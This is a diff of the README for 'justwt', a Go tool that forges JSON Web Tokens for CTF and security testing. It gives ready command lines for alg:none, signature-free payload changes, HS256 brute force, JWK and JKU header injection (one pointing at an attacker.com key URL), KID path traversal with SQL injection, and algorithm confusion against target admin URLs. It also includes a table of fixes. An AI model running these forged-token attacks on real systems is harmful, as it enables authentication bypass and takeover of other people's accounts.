@@ -1,94 +1,305 @@
 # Just Wreck Tokens (justwt)
 
-![Version](https://img.shields.io/badge/version-1.0-brightmagenta.svg)
-![Author](https://img.shields.io/badge/author-buzz-purple.svg)
-![Language](https://img.shields.io/badge/language-Go-cyan.svg)
+```
+  ___ _   _ _____ _____   _    _______ _____ _____  _   __  _____ _____ _   __ _____ _   _  _____ 
+  |_  | | | /  ___|_   _| | |  | | ___ \  ___/  __ \| | / / |_   _|  _  | | / /|  ___| \ | |/  ___|
+    | | | | \ '--.  | |   | |  | | |_/ / |__ | /  \/| |/ /    | | | | | | |/ / | |__ |  \| |\ '---. 
+    | | | | |'--. \ | |   | |/\| |    /|  __|| |    |    \    | | | | | |    \ |  __|| . ' | '---. \
+/\__/ / |_| /\__/ / | |   \  /\  / |\ \| |___| \__/\| |\  \   | | \ \_/ / |\  \| |___| |\  |/\__/ /
+\____/ \___/\____/  \_/    \/  \/\_| \_\____/ \____/\_| \_/   \_/  \___/\_| \_/\____/\_| \_/\____/ 
+```
 
-Comprehensive JWT attack tool for security testing & CTF challenges.
+> **Comprehensive JWT Attack Tool** — Generate forged tokens exploiting common vulnerabilities (alg:none, JWK injection, JKU injection, algorithm confusion, KID traversal, brute-force). Built for CTF challenges & security testing.
 
-## Installation
+**Author:** buzz | **Version:** v1.0 | **Language:** Go
+
+---
+
+## 🚀 Installation
 
 ```bash
-git clone https://github.com/buzz/just-wreck-tokens
-cd just-wreck-tokens
+cd /path/to/just-wreck-tokens
 go build -o justwt .
-sudo mv justwt /usr/local/bin/
+./justwt -h
 ```
 
-Or use the alias directly:
+---
+
+## ⚡ Basic Usage
+
+Every command requires 3 parameters:
+
 ```bash
-justwt -h
+justwt -jwt TOKEN -payload '{"isAdmin": true, "sub": "admin"}' -url https://target/admin -all
 ```
 
-## Quick Start
+| Parameter | Description |
+|-----------|-------------|
+| `-jwt` | The JWT token to attack |
+| `-payload` | JSON payload to inject (replaces original) |
+| `-url` | Target URL to test |
+
+---
+
+## 🎯 Attacks
+
+### 1️⃣ **PAYLOAD MUTATION** — Change payload, keep signature
+
+For servers that don't validate signatures, just modify the payload.
 
 ```bash
-justwt -jwt $TOKEN -payload '{"admin":true}' -kid -url https://target/admin -v
+justwt -jwt $TOKEN \
+  -payload '{"isAdmin": true, "sub": "admin"}' \
+  -url https://target/admin \
+  -payload-only -v
 ```
 
-## Attack Types
+**Flags:**
+- `-payload-only` — Enable this attack
+
+---
+
+### 2️⃣ **ALG:NONE BYPASS** — Remove signature requirement
+
+Forces server to skip signature verification by setting `alg` to `none`.
+
+```bash
+justwt -jwt $TOKEN \
+  -payload '{"isAdmin": true, "sub": "admin"}' \
+  -url https://target/admin \
+  -none -v
+```
+
+**Flags:**
+- `-none` — Enable this attack
+
+---
+
+### 3️⃣ **BRUTE FORCE** — Crack HS256 secret
+
+Test a wordlist against the original token signature.
+
+```bash
+justwt -jwt $TOKEN \
+  -payload '{"isAdmin": true, "sub": "admin"}' \
+  -url https://target/admin \
+  -brute -wordlist /path/to/wordlist.txt -v
+```
+
+**Flags:**
+- `-brute` — Enable brute-force
+- `-wordlist <path>` — Path to wordlist file
+
+---
+
+### 4️⃣ **JWK INJECTION** — Embed public key in header
+
+Generate a keypair, sign with private key, embed public key in `jwk` header.
+
+```bash
+justwt -jwt $TOKEN \
+  -payload '{"isAdmin": true, "sub": "admin"}' \
+  -url https://target/admin \
+  -jwk -v
+```
+
+**Flags:**
+- `-jwk` — Enable JWK injection
+- `-private-key <file>` — Use PEM private key instead of generating one
+
+---
+
+### 5️⃣ **JKU INJECTION** — Host key on external server
+
+Auto-deploy public key to surge.sh, sign token with private key.
+
+```bash
+justwt -jwt $TOKEN \
+  -payload '{"isAdmin": true, "sub": "admin"}' \
+  -url https://target/admin \
+  -jku -surge-name mycustom -v
+```
+
+**Flags:**
+- `-jku` — Enable JKU injection
+- `-surge-name <name>` — Custom surge.sh subdomain (e.g., `httpcats` → `httpcats.surge.sh`)
+- `-jku-url <url>` — Manual JKU endpoint (skip auto-deploy)
+- `-jku-encode` — Base64 encode JKU value (bypass path filters)
+- `-private-key <file>` — Use PEM private key
+
+**Example with custom JKU:**
+```bash
+justwt -jwt $TOKEN \
+  -payload '{"isAdmin": true, "sub": "admin"}' \
+  -url https://target/admin \
+  -jku -jku-url https://attacker.com/public-key.json -v
+```
+
+---
+
+### 6️⃣ **KID PATH TRAVERSAL** — Exploit key lookup
+
+Try path traversal payloads (`../dev/null`, `../../dev/null`, etc.) and SQL injection in `kid` field.
+
+```bash
+justwt -jwt $TOKEN \
+  -payload '{"isAdmin": true, "sub": "admin"}' \
+  -url https://target/admin \
+  -kid -v
+```
+
+**Flags:**
+- `-kid` — Enable KID traversal
+
+---
+
+### 7️⃣ **ALGORITHM CONFUSION** — RS256 → HS256
+
+**Auto-detection:** If the original token has a `jku` header, automatically fetch the public key and attempt algorithm confusion.
+
+```bash
+# Auto-detect from token's jku header
+justwt -jwt $TOKEN \
+  -payload '{"isAdmin": true, "sub": "admin"}' \
+  -url https://target/admin \
+  -alg-confusion -v
+```
+
+**Manual mode with public key from file:**
+```bash
+justwt -jwt $TOKEN \
+  -payload '{"isAdmin": true, "sub": "admin"}' \
+  -url https://target/admin \
+  -alg-confusion -target /path/to/public.pem -v
+```
+
+**Flags:**
+- `-alg-confusion` — Enable algorithm confusion
+- `-target <url|file>` — Public key URL or file path
+- `-sig2n-token2 <jwt>` — 2nd JWT for sig2n extraction (requires Docker)
+
+---
+
+## 🔧 Global Options
 
 | Flag | Description |
 |------|-------------|
-| `-all` | Run all attack types |
-| `-none` | Alg:none bypass (multiple case variations) |
-| `-jwk` | JWK header injection (self-signed) |
-| `-jku` | JKU header injection with auto-deploy |
-| `-jku-encode` | Base64 encode JKU (bypass path filters) |
-| `-kid` | KID path traversal `/dev/null` + SQL injection |
-| `-alg-confusion` | RS256 → HS256 algorithm confusion |
-| `-x5c` | X5C certificate chain injection |
-| `-x5u-inject` | X5U certificate URL injection |
-| `-brute` | HS256 brute-force with wordlist |
-| `-payload-only` | Change payload, keep original signature |
+| `-cookie <name>` | Cookie name for token (default: `session`) |
+| `-v` | Verbose mode (show all token headers) |
+| `-private-key <file>` | PEM private key for RSA signing (JWK/JKU) |
 
-## Examples
-
-### KID Path Traversal
+**Example:**
 ```bash
-justwt -jwt $TOKEN -payload '{"sub":"admin"}' -kid -url https://target/admin
+justwt -jwt $TOKEN \
+  -payload '{"admin":true}' \
+  -url https://target \
+  -all \
+  -cookie access_token \
+  -v
 ```
 
-### JKU with Path Encoding Bypass
+---
+
+## 🚩 Run All Attacks
+
 ```bash
-justwt -jwt $TOKEN -payload '{"admin":true}' -jku -jku-encode -url https://target
+justwt -jwt $TOKEN \
+  -payload '{"isAdmin": true, "sub": "admin"}' \
+  -url https://target/admin \
+  -all -v
 ```
 
-### Algorithm Confusion with sig2n
-```bash
-justwt -jwt $TOKEN1 -jwt $TOKEN2 -alg-confusion -sig2n-token2 $TOKEN2 -url https://target
+This runs: payload mutation → alg:none → brute-force → JWK → JKU → KID traversal → algorithm confusion
+
+---
+
+## 📊 Output Format
+
+**Success:**
+```
+✓ #12  JKU (JWKS Set)
+    eyJhbGciOiJSUzI1NiIsImp...
+    [+] HTTP 200 | Length: 1208 ← SUCCESS
 ```
 
-### Brute-force HS256
-```bash
-justwt -jwt $TOKEN -payload '{"admin":true}' -brute -wordlist /path/to/wordlist.txt -url https://target
+**Failed:**
+```
+✗ #1   Payload (keep sig)
+    eyJhbGciOiJSUzI1NiI...
+    [~] HTTP 401 | Length: 500
 ```
 
-## Output Style
-
-Tool uses color-coded annotations:
+**Color Codes:**
 - `[+]` Success (Green)
-- `[-]` Error (Red)
-- `[x]` Failed/Skipped (Gray)
-- `[~]` Info/Warning (Yellow)
+- `[x]` Error (Red)
+- `[~]` Info (Yellow)
+- `[!]` Warning (Yellow)
 
-## Features
+---
 
-✓ 10+ JWT attack types  
-✓ Auto-surge.sh deployment  
-✓ sig2n Docker integration  
-✓ HTTP response analysis  
-✓ Verbose mode  
-✓ Color-coded output  
+## 💡 Real-World Examples
 
-## Requirements
+### PortSwigger Lab: JWT with JWK
 
-- Go 1.21+
-- surge.sh CLI (optional, for auto-deploy)
-- Docker (optional, for sig2n extraction)
+```bash
+justwt -jwt eyJraWQiOiI5MTU2ZDk0NS1jNzZlLTQyNzAtOWUzMC02MWRjMzA0MTUwODciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczODM2OTMyNCwic3ViIjoid2llbmVyIn0.xyz... \
+  -payload '{"sub":"administrator","iss":"portswigger","exp":1738369324}' \
+  -url https://0a1234567890abcd.web-security-academy.net/admin \
+  -jwk -v
+```
 
-## License
+### CTF: JKU Injection with Custom Subdomain
+
+```bash
+justwt -jwt $HARDEN_TOKEN \
+  -payload '{"isAdmin":true,"sub":"admin"}' \
+  -url https://httpcats.hardenctf.fr/admin \
+  -jku -surge-name httpcats \
+  -cookie access-token -v
+```
+
+### Manual Algorithm Confusion
+
+```bash
+justwt -jwt $TOKEN \
+  -payload '{"admin":true}' \
+  -url https://target/admin \
+  -alg-confusion -target https://target/jwks.json -v
+```
+
+---
+
+## 📝 Requirements
+
+- **Go 1.21+** — To build the tool
+- **surge.sh CLI** (optional) — For JKU auto-deployment
+- **Docker** (optional) — For sig2n extraction
+
+Install surge:
+```bash
+npm install -g surge
+```
+
+---
+
+## 🔗 JWT Vulnerabilities Explained
+
+| Attack | Vulnerability | Fix |
+|--------|-------------|-----|
+| Payload Mutation | No signature validation | Always validate signatures |
+| Alg:None | Accepts `alg: null` | Whitelist allowed algorithms |
+| Brute-Force | Weak secret | Use strong random secrets (256+ bits) |
+| JWK Injection | Header JWK trusted blindly | Validate JWK against known keys only |
+| JKU Injection | Fetches key from untrusted URL | Whitelist allowed JKU domains |
+| KID Traversal | Unsanitized `kid` parameter | Validate KID format strictly |
+| Alg Confusion | RSA key used as HMAC secret | Check algorithm consistency |
+
+---
+
+## 📄 License
 
 MIT
 
-# Just-Wreck-Tokens
+---
+
+**Made with 🔥 by buzz**
